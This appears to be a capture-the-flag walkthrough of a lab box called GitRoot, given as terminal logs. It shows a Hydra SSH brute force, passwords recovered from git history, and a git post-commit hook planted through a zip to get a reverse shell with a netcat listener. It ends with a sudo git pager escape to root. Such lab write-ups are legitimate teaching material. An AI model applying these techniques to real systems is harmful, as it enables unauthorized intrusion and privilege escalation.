@@ -1,0 +1,395 @@
+Dirbusting and find interesting domain: repo.gitroot.vuln
+Inside found index file...
+
+oot@ap:~/CTF/GitRoot# strings index 
+DIRC
+D33513a92c025212dd3ab564ca8682e2675f2f99bba5a7f521453d1deae7902aa.txt
+GkL^
+get.php
+	index.php
+3K*P'cg
+pablo_HELP.txt
+v;T&w^
+set.php
+GkL^
+	stats.php
+TREE
+root@ap:~/CTF/GitRoot# 
+
+
+
+try with hydra and user found before: 
+User: jen, beth, pablo
+Pass: all pass matched with "master" in rockyou.txt
+
+
+
+root@ap:~/CTF/GitRoot# hydra -L user -P pass.txt ssh://192.168.0.3
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-23 20:39:12
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 201 login tries (l:3/p:67), ~13 tries per task
+[DATA] attacking ssh://192.168.0.3:22/
+[22][ssh] host: 192.168.0.3   login: pablo   password: mastergitar
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-23 20:39:42
+
+
+Credentials found!!
+pablo:mastergitar
+
+
+Inside machine...
+pablo@GitRoot:~$ ls -la
+total 32
+drwxr-xr-x 4 pablo pablo 4096 May 26 02:24 .
+drwxr-xr-x 5 root  root  4096 May 26 00:22 ..
+lrwxrwxrwx 1 pablo pablo    9 May 26 01:32 .bash_history -> /dev/null
+-rw-r--r-- 1 pablo pablo  220 May 25 18:39 .bash_logout
+-rw-r--r-- 1 pablo pablo 3526 May 25 18:39 .bashrc
+drwx------ 3 pablo pablo 4096 May 25 22:48 .gnupg
+-rw-r--r-- 1 pablo pablo  807 May 25 18:39 .profile
+drwx-wx-wx 2 pablo pablo 4096 May 25 23:08 public
+-rw-r--r-- 1 root  root   871 May 26 02:24 user.txt
+pablo@GitRoot:~$ cat user.txt 
+
+  _______ _                 _                          _____      _     _       
+ |__   __| |               | |                        |  __ \    | |   | |     
+    | |  | |__   __ _ _ __ | | __  _   _  ___  _   _  | |__) |_ _| |__ | | ___  
+    | |  | '_ \ / _` | '_ \| |/ / | | | |/ _ \| | | | |  ___/ _` | '_ \| |/ _ \ 
+    | |  | | | | (_| | | | |   <  | |_| | (_) | |_| | | |  | (_| | |_) | | (_) 
+    |_|  |_| |_|\__,_|_| |_|_|\_\  \__, |\___/ \__,_| |_|   \__,_|_.__/|_|\___/ 
+                                    __/ |                                       
+                                   |___/                                        
+
+
+
+Great job! Do not falter, there is more to do. You made it this far, finish the race!
+
+"It's not that I'm so smart. Its just that I stay with problems longer." - Albert Einstein 
+
+8a81007ea736a2b8a72a624672c375f9ac707b5e
+
+
+Inside public folder found a message from beth:
+pablo@GitRoot:~/public$ cat message.txt 
+Hey pablo
+
+Make sure to check-out our brand new git repo!
+
+
+Surfing into the machine..
+
+pablo@GitRoot:/var/www/repo$ cat 33513a92c025212dd3ab564ca8682e2675f2f99bba5a7f521453d1deae7902aa.txt 
+pablo_S3cret_P@ss
+beth_S3cret_P@ss
+jen_S3cret_P@ss
+
+
+
+Finally, found a password:
+pablo@GitRoot:/opt/auth/.git/logs/refs/heads$ cat * | grep add
+fc9901f3b6b303d6ad40cdb71689f1646904f7b3 d806b6d8decc7d43a21f7c6261a873f5846addbe Your Name <you@example.com> 1590500016 -0400	commit: init repo
+d806b6d8decc7d43a21f7c6261a873f5846addbe 3b73063bbcda6041c52ade26f9fd0d9e84b16155 Your Name <you@example.com> 1590500198 -0400	commit: init repo
+5f100702687bc9118bd766ad93ccbcaaf2b661d5 a8e30a3f1cadd63b9a5aaf483a9af9fb53581db6 Your Name <you@example.com> 1590500198 -0400	commit: init repo
+773cc866e2262bb474e7f12b26032bf7b70adff4 9fb9ba744ba85d40e82e820add677dd2cf43a9a0 Your Name <you@example.com> 1590500199 -0400	commit: init repo
+8271d3180228fdbf631112d97455945448eb9d11 83de26a6fc5ec288dd70dae46baddcb91547258b Your Name <you@example.com> 1590500197 -0400	commit: init repo
+b2ab5f540baab4c299306e16f077d7a6f6556ca3 06fbefc1da56b8d552cfa299924097ba1213dd93 Your Name <you@example.com> 1590500148 -0400	commit: added some stuff
+pablo@GitRoot:/opt/auth/.git/logs/refs/heads$ git show 06fbefc1da56b8d552cfa299924097ba1213dd93
+commit 06fbefc1da56b8d552cfa299924097ba1213dd93
+Author: Your Name <you@example.com>
+Date:   Tue May 26 09:35:48 2020 -0400
+
+    added some stuff
+
+diff --git a/main.c b/main.c
+index 70e6397..8af9b9c 100644
+--- a/main.c
++++ b/main.c
+@@ -4,6 +4,15 @@
+ int main(){
+ 
+         char pass[20];
+-       return 0;
++        scanf("%20s", pass);
++        printf("You put %s\n", pass);
++        if (strcmp(pass, "r3vpdmspqdb") == 0 ){
++                char *cmd[] = { "bash", (char *)0 };
++                execve("/bin/bash", cmd, (char *) 0);
++        }
++        else{
++                puts("BAD PASSWORD");
++        }
++        return 0;
+ }
+-//43
++
+pablo@GitRoot:/opt/auth/.git/logs/refs/heads$ 
+
+
+################################################################
+Credentails:
+beth:r3vpdmspqdb
+################################################################
+
+Another message:
+root@ap:~/CTF/GitRoot# scp beth@192.168.0.3:public/add* .
+beth@192.168.0.3's password: 
+addToMyRepo.txt                                                                                                                                             100%  151    19.1KB/s   00:00    
+root@ap:~/CTF/GitRoot# cat addToMyRepo.txt 
+Hello Beth
+
+If you want to commit to my repository you can add a zip file to ~jen/public/repos/ and ill unzip it and add it to my repository
+
+Thanks!
+
+
+
+Create a reverse shell with .git/hooks/post-commit:
+beth@GitRoot:/tmp$ mkdir .git
+beth@GitRoot:/tmp$ cd .git/
+beth@GitRoot:/tmp/.git$ mkdir hooks
+beth@GitRoot:/tmp/.git$ cd hooks/
+beth@GitRoot:/tmp/.git/hooks$ vim post-commit
+beth@GitRoot:/tmp/.git/hooks$ chmod 777 post-commit 
+beth@GitRoot:/tmp/.git/hooks$ ls -la
+total 12
+drwxr-xr-x 2 beth beth 4096 Jun 23 15:19 .
+drwxr-xr-x 3 beth beth 4096 Jun 23 15:19 ..
+-rwxrwxrwx 1 beth beth   53 Jun 23 15:19 post-commit
+beth@GitRoot:/tmp/.git/hooks$ cd ..
+beth@GitRoot:/tmp/.git$ cd ..
+beth@GitRoot:/tmp$ chmod 777 .git/
+beth@GitRoot:/tmp$ 7z a subscribes.zip .git/
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) M-5Y10c CPU @ 0.80GHz (306D4),ASM,AES-NI)
+
+Scanning the drive:
+2 folders, 1 file, 53 bytes (1 KiB)
+
+Creating archive: subscribes.zip
+
+Items to compress: 3
+
+    
+Files read from disk: 1
+Archive size: 487 bytes (1 KiB)
+Everything is Ok
+beth@GitRoot:/tmp$ ls -l
+total 16
+-rw-r--r-- 1 beth beth  487 Jun 23 15:20 subscribes.zip
+drwx------ 3 root root 4096 Jun 23 14:15 systemd-private-d02612830c63473e95c200550be28aa1-apache2.service-rJGv2o
+drwx------ 3 root root 4096 Jun 23 14:15 systemd-private-d02612830c63473e95c200550be28aa1-memcached.service-ZySwKT
+drwx------ 3 root root 4096 Jun 23 14:15 systemd-private-d02612830c63473e95c200550be28aa1-systemd-timesyncd.service-TnP4Sq
+beth@GitRoot:/tmp$ cp subscribes.zip /home/jen/public/repos/
+beth@GitRoot:/tmp$ 
+
+
+Start listener:
+root@ap:~/CTF/GitRoot# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.5] from (UNKNOWN) [192.168.0.3] 33982
+id
+uid=1003(jen) gid=1003(jen) groups=1003(jen)
+
+
+Found final credential into .viminfo:
+jen@GitRoot:~$ cat .viminfo
+cat .viminfo
+# This viminfo file was generated by Vim 8.1.
+# You may edit it if you're careful!
+
+# Viminfo version
+|1,4
+
+# Value of 'encoding' when this file was written
+*encoding=utf-8
+
+
+# hlsearch on (H) or off (h):
+~h
+# Command Line History (newest to oldest):
+:wq
+|2,0,1590471909,,"wq"
+:q!
+|2,0,1590471893,,"q!"
+:Q!
+|2,0,1590471892,,"Q!"
+
+# Search String History (newest to oldest):
+?/binzpbeocnexoe
+|2,1,1590471908,47,"binzpbeocnexoe"
+
+# Expression History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Debug Line History (newest to oldest):
+
+# Registers:
+
+# File marks:
+'0  1  0  ~/test.txt
+|4,48,1,0,1590471909,"~/test.txt"
+'1  1  0  ~/test.txt
+|4,49,1,0,1590471893,"~/test.txt"
+
+# Jumplist (newest first):
+-'  1  0  ~/test.txt
+|4,39,1,0,1590471909,"~/test.txt"
+-'  1  0  ~/test.txt
+|4,39,1,0,1590471893,"~/test.txt"
+
+# History of marks within files (newest to oldest):
+
+> ~/test.txt
+	*	1590471908	0
+	"	1	0
+jen@GitRoot:~$ sudo -l
+sudo -l
+Matching Defaults entries for jen on GitRoot:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jen may run the following commands on GitRoot:
+    (ALL) /usr/bin/git
+jen@GitRoot:~$ 
+
+
+
+jen@GitRoot:~$ sudo /usr/bin/git -p help config
+sudo /usr/bin/git -p help config
+WARNING: terminal is not fully functional
+-  (press RETURN)!/bin/sh
+!//bbiinn//sshh!/bin/sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+cd /root
+# ls
+ls
+passwords  POC	root.txt  setpasswords.php
+# cat root.txt
+cat root.txt
+                                                         /////                                                         
+                                                      ////////////.                                                     
+                                                   */////////////////                                                   
+                                                 //////////////////////.                                                
+                                              *///////////////////////////                                              
+                                            ////////////////////////////////.                                           
+                                             */////////////////////////////////                                         
+                                                /////////////////////////////////.                                      
+                                    *///.         */////////////////////////////////                                    
+                                  /////////          /////////////////////////////////.                                 
+                               */////////////.         */////////////////////////////////                               
+                             ///////////////////                .//////////////////////////,                            
+                          *///////////////////////.                .//////////////////////////                          
+                        ////////////////////////////                 ///////////////////////////,                       
+                     *//////////////////////////////                  /////////////////////////////                     
+                   /////////////////////////////////                 ////////////////////////////////,                  
+                *////////////////////////////////////                 ,/////////////////////////////////                
+              /////////////////////////////////////////                  /////////////////////////////////,             
+           ,/////////////////////////////////////////////       ..         ,/////////////////////////////////           
+         ////////////////////////////////////////////////       .///          /////////////////////////////////.        
+      ,//////////////////////////////////////////////////       ./////.         */////////////////////////////////      
+    /////////////////////////////////////////////////////       .////////                ,//////////////////////////.   
+  ///////////////////////////////////////////////////////       .//////////.                .////////////////////////// 
+,////////////////////////////////////////////////////////       .////////////                 //////////////////////////
+/////////////////////////////////////////////////////////       .///////////,                  /////////////////////////
+ ////////////////////////////////////////////////////////       .////////////                 //////////////////////////
+  ///////////////////////////////////////////////////////       ./////////////               /////////////////////////* 
+    ,////////////////////////////////////////////////////       .///////////////           /////////////////////////    
+       //////////////////////////////////////////////////       .////////////////////////////////////////////////*      
+         ,///////////////////////////////////////////////       .//////////////////////////////////////////////         
+            /////////////////////////////////////////////       .///////////////////////////////////////////*           
+              ,/////////////////////////////////////////         /////////////////////////////////////////              
+                 ////////////////////////////////////*              ///////////////////////////////////*                
+                   ,////////////////////////////////                 ////////////////////////////////                   
+                      //////////////////////////////                  /////////////////////////////                     
+                        ,///////////////////////////                 ///////////////////////////                        
+                           //////////////////////////               //////////////////////////                          
+                             ,/////////////////////////           /////////////////////////                             
+                                /////////////////////////////////////////////////////////                               
+                                  ,///////////////////////////////////////////////////                                  
+                                     ///////////////////////////////////////////////                                    
+                                       ,/////////////////////////////////////////                                       
+                                          /////////////////////////////////////                                         
+                                            .///////////////////////////////                                            
+                                               ///////////////////////////                                              
+                                                 ./////////////////////                                                 
+                                                    /////////////////                                                   
+                                                      .///////////                 
+
+
+
+
+Thank you for completing my box! Please let my know what you liked and what you didn't like at my twitter @Recursive_NULL
+
+
+
+734ae32be131cd0681f86c03858f4f587a3c69ce
+# ls
+ls
+passwords  POC	root.txt  setpasswords.php
+# ls -la
+ls -la
+total 44
+drwx------  5 root root 4096 May 26 10:02 .
+drwxr-xr-x 18 root root 4096 May 25 18:27 ..
+lrwxrwxrwx  1 root root    9 May 26 01:23 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwx------  3 root root 4096 May 25 21:53 .gnupg
+drwxr-xr-x  3 root root 4096 May 25 19:15 .local
+-rw-r--r--  1 root root   56 May 25 21:47 passwords
+drwxr-xr-x  2 root root 4096 May 26 10:00 POC
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root 5940 May 26 02:23 root.txt
+-rw-r--r--  1 root root  569 May 25 21:48 setpasswords.php
+# cat setpassword.php
+cat setpassword.php
+cat: setpassword.php: No such file or directory
+# cat set*
+cat set*
+<?php
+$pabloKey = "pablo_S3cret_P@ss";
+$bethKey =  "beth_S3cret_P@ss";
+$jenKey =   "jen_S3cret_P@ss";
+$pabloValue = "9ebc63a534f8a854941bbbabdf92325fcd2d2e29";
+$bethValue =  "c6ded2c7fc7281cefb3a2373005d91eb1f32830e";
+$jenValue =   "6930002a9efc93e8bce7bfc48fb09320eb154e4b";
+$gitmem = new Memcached();
+$gitmem->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
+$gitmem->setSaslAuthData("pablo@gitroot", "ihjedpvqfe");
+$gitmem->addServer("127.0.0.1", 11211);
+$gitmem->set($pabloKey, $pabloValue);
+$gitmem->set($bethKey, $bethValue);
+$gitmem->set($jenKey, $jenValue);
+?>
+# cat pass*
+cat pass*
+pablo
+mastergitar
+
+beth
+r3vpdmspqdb
+
+jen
+binzpbeocnexoe
+# 
+
+
+
+Another way to root:
+jen@GitRoot:~$ sudo /usr/bin/git branch --help config
+sudo /usr/bin/git branch --help config
+WARNING: terminal is not fully functional
+-  (press RETURN)!/bin/sh
+!//bbiinn//sshh!/bin/sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+
